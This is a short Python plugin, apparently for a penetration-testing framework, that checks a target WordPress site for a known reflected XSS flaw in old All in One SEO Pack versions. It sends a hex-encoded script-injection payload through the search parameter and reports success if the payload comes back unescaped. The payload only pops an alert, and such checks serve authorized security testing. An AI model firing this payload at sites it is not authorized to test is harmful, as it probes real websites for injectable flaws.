#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.plugins import logger
from modules.http import http

author = "Chu <root@sh3ll.me>"
title = "All in one 插件反射XSS"
description = "WordPress All in One SEO Pack 插件低版本反射型 XSS, 影响版本1.3.6.4 - 2.0.3"
reference = "http://archives.neohapsis.com/archives/bugtraq/2013-10/0006.html"

options = {
    "target":"http://xxoo.com"
}

payload = r"/?s=\\x3c\\x2f\\x74\\x69\\x74\\x6c\\x65\\x3e\\x3c\\x73"\
        r"\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74"\
        r"\\x28\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x64"\
        r"\\x6f\\x6d\\x61\\x69\\x6e\\x29\\x3c\\x2f\\x73\\x63\\x72"\
        r"\\x69\\x70\\x74\\x3e"

rule = "</title><script>alert(document.domain)</script>"

def valiator(string):
    if rule in string:
        return True
    else:
        return False

def exploit(options):
    # 设置URL
    url = options["target"]["current_value"] + payload

    logger.process("send request...")

    response = http.get(url)

    if valiator(response.text) == True:
        logger.success("exploit success, target site have xss vuln ! :)")
        return True
    else:
        logger.error("exploit fail, target site no xss ! :(")
        return False

